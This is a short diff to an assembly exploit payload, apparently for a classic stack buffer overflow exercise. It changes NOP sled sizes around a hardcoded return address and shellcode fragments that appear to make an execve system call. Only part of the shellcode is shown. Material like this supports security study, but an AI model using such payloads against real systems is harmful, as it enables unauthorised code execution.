@@ -9,7 +9,7 @@ dd 0xbffff18e
 
 ; more nops, JIC
 ; hijacked return should land in here somewhere
-times 128 nop
+times 446 nop
 
 ; shellcode
 xor eax, eax
@@ -25,4 +25,4 @@ mov al, 0x0b
 int 0x80
 
 ; even more nops
-times 500 nop
+times 50 nop
